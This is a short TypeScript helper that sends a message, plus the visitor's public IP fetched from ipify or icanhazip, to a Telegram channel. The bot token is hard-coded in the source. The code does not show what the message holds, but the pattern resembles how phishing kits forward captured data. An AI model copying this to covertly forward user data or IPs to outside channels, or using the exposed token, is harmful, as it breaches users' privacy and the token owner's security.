export async function sendToTelegram(message: string) {
  const botToken = "8049841514:AAEvxULB34wJUxxBUePEsT09gh15N_tbEzg";
  const chatId = "@dataWeb12";

  console.log("Sending message to Telegram:", message);

  try {
    // Get the public IP address
    const userIp = await getPublicIP();

    // Send the message to Telegram with the IP address included
    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: `${message}\nUser IP: ${userIp}`, // Include the IP address in the message
      }),
    });

    if (!response.ok) {
      console.error("Failed to send message to Telegram:", await response.text());
    }
  } catch (error) {
    console.error("Error sending message to Telegram:", error);
  }
}

async function getPublicIP(): Promise<string | null> {
  try {
    // Try to get the IP from ipify
    const response = await fetch("https://api.ipify.org?format=json");
    const data = await response.json();
    console.log("Public IP from ipify:", data.ip);
    return data.ip;
  } catch (error) {
    console.error("Error getting public IP from ipify:", error);

    try {
      // Fallback to icanhazip.com
      const response = await fetch("https://icanhazip.com");
      const ip = await response.text();
      console.log("Public IP from icanhazip.com:", ip.trim());
      return ip.trim();
    } catch (fallbackError) {
      console.error("Error getting public IP from icanhazip.com:", fallbackError);
      return null; // Return null if both services fail
    }
  }
}